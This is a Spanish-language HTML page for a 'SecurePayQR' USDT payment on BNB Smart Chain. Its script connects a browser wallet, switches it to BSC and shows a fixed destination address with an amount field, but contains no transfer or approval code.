<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar USDT (BEP-20)</title>
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f7f9ff; background-image: radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%), radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%), radial-gradient(circle at 55% 105%, rgba(145, 175, 255, 0.13) 0%, transparent 46%), linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%); background-size: 125% 125%, 135% 135%, 120% 120%, 100% 100%; background-attachment: fixed; color: #111111; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 30px; }
        .tw-container { width: 100%; max-width: 390px; padding: 20px; flex: 1; }
        .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 24px; }
        .tw-header-title { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 7px; margin-bottom: 15px; text-align: center; width: 100%; }
        .tw-header-title-main { font-size: 21px; line-height: 1.2; font-weight: 700; color: #111111; }
        .tw-network-badge { display: inline-flex; align-items: center; justify-content: center; padding: 4px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
        .tw-input-group { background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 16px; padding: 16px; margin-bottom: 16px; box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055); }
        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
        .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .tw-btn:disabled { background-color: #b3ccff; }
        .network-card { display: none; align-items: center; gap: 11px; margin: 4px 0 22px; padding: 12px 14px; width: 100%; background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 14px; }
        .network-card-logo { width: 30px; height: 30px; object-fit: contain; flex: 0 0 auto; }
        .network-card-copy { min-width: 0; flex: 1; display: flex; flex-direction: column; gap: 2px; }
        .network-card-label { color: #717680; font-size: 11px; }
        .network-card-name { color: #111111; font-size: 14px; font-weight: 650; }
        .network-card-badge { padding: 5px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
        .tw-address-box { border: 1px solid #e3e5e8; border-radius: 14px; padding: 12px 14px; background: #ffffff; }
        .site-footer { position: fixed; left: 0; right: 0; bottom: 0; width: 100%; text-align: center; padding: 10px 15px 12px; font-size: 12px; color: #717680; background: #ffffff; }
        .page-loader { position: fixed; inset: 0; z-index: 9999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.45s ease; }
        .page-loader.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .loader-logo { width: 110px; height: 110px; margin-bottom: 22px; }
        .loader-spinner { width: 32px; height: 32px; border: 3px solid #e4e9f2; border-top-color: #0052ff; border-radius: 50%; animation: loaderSpin 0.8s linear infinite; }
        @keyframes loaderSpin { to { transform: rotate(360deg); } }
        .amount-stage { display: none; }
    </style>
    <style id="bnb-dark-visual-theme">
        :root{color-scheme:dark;--bnb-gold:#f3ba2f}
        html,body{background:#000!important;color:#fff!important}
        body{ background: radial-gradient(ellipse at 8% 10%,rgba(243,186,47,.16),transparent 34%), #000!important; background-attachment:fixed!important; }
        .tw-container,.tw-input-group,.tw-address-box,#tronNetworkInfo.network-card{ background:#0b0b0c!important; border-color:rgba(255,255,255,.16)!important; }
        input{color:#fff!important;-webkit-text-fill-color:#fff!important}
        #connectBtn{ background:linear-gradient(90deg,#efad16,#ffd541)!important; color:#050505!important; border:none!important; }
        #status{ background:rgba(18,18,19,.95)!important; color:#fff!important; }
        .network-card-badge,.tw-network-badge{ background:rgba(243,186,47,.10)!important; color:#f3ba2f!important; }
    </style>
</head>
<body>

<div id="pageLoader" class="page-loader">
    <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
    <div style="margin-top:14px;color:#717680;font-size:13px;">Cargando...</div>
</div>

<div class="tw-container">
    <div class="tw-header">
        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>
            <span class="tw-network-badge">BEP-20</span>
        </div>
        <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="QR Pagos" class="tw-logo">
    </div>

    <div class="connected-summary-panel">
        <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
            <label class="tw-label">Dirección conectada</label>
            <div class="tw-input-row">
                <div id="walletAddressText" class="tw-input" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"></div>
            </div>
        </div>

        <div id="tronNetworkInfo" class="network-card">
            <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="BNB" class="network-card-logo">
            <div class="network-card-copy">
                <span class="network-card-label">Red conectada</span>
                <span class="network-card-name">BNB Smart Chain</span>
            </div>
            <span class="network-card-badge">BEP-20</span>
        </div>

        <div class="tw-input-group tw-address-box">
            <label class="tw-label" for="addressDisplay">Dirección de destino</label>
            <div class="tw-input-row">
                <input id="addressDisplay" class="tw-input" type="text" readonly tabindex="-1">
            </div>
        </div>
    </div>

    <div class="tw-input-group amount-stage" id="amountStageBox" style="display: none;">
        <label class="tw-label" for="amountDisplay">Cantidad</label>
        <div class="tw-input-row">
            <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any">
            <span class="tw-currency-badge">USDT</span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <div style="margin-top: 40px;">
        <button class="tw-btn" id="connectBtn">Conectar a la Pasarela de pago</button>
    </div>
</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
</footer>

<script>
window.addEventListener('load', () => { 
    setTimeout(() => { document.getElementById('pageLoader')?.classList.add('hidden'); }, 800); 
});

const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
const BSC_CHAIN_ID = "0x38";

const connectBtn = document.getElementById("connectBtn");
const statusDiv = document.getElementById("status");
const addressDisplay = document.getElementById("addressDisplay");
const walletInfo = document.getElementById("walletInfo");
const walletAddressText = document.getElementById("walletAddressText");
const networkInfo = document.getElementById("tronNetworkInfo");
const amountStageBox = document.getElementById("amountStageBox");

let walletAddress = null;
addressDisplay.value = BILLETERA_DESTINO;

function setStatus(m) {
    statusDiv.innerText = m || "";
    statusDiv.style.display = m ? "block" : "none";
}

function getProvider() {
    if (window.ethereum) return window.ethereum;
    if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
    throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
}

async function rpc(method, params = []) {
    return getProvider().request({ method, params });
}

// Normalizador infalible para el Chain ID (maneja hexadecimal, decimal, strings o números)
function parseChainId(raw) {
    if (!raw) return 0;
    if (typeof raw === "number") return raw;
    if (typeof raw === "bigint") return Number(raw);
    const s = String(raw).trim().toLowerCase();
    if (s.startsWith("0x")) return parseInt(s, 16);
    return parseInt(s, 10);
}

async function ensureBSC() {
    const rawId = await rpc("eth_chainId");
    const chainNum = parseChainId(rawId);
    console.log("Chain ID detectado:", rawId, "Parseado:", chainNum);

    // Verificación flexible para evitar el error de red no reconocida
    if (chainNum === 56 || rawId === "0x38" || rawId === "0X38") return;

    try {
        await rpc("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
    } catch (e) {
        if (e?.code === 4902 || e?.message?.includes("Unrecognized chain")) {
            await rpc("wallet_addEthereumChain", [{
                chainId: BSC_CHAIN_ID,
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
            }]);
        } else {
            throw e;
        }
    }
}

connectBtn.addEventListener("click", async () => {
    try {
        setStatus("Conectando con BNB Smart Chain...");
        connectBtn.disabled = true;
        
        await ensureBSC();
        const accounts = await rpc("eth_requestAccounts");
        walletAddress = accounts?.[0];
        
        if (!walletAddress) throw new Error("No se obtuvo la cuenta de la billetera.");
        
        walletAddressText.textContent = walletAddress.slice(0, 6) + "..." + walletAddress.slice(-4);
        walletInfo.style.display = "block";
        networkInfo.style.display = "flex";
        amountStageBox.style.display = "block";
        
        setStatus("¡Conectado con éxito a la red BSC!");
        connectBtn.innerText = "Listo para operar";
        connectBtn.disabled = true; // Se mantiene asegurado para el flujo de pago
    } catch (e) {
        console.error("Error en conexión:", e);
        setStatus(e.message || "Error al conectar la pasarela.");
        connectBtn.disabled = false;
    }
});
</script>

</body>
</html>
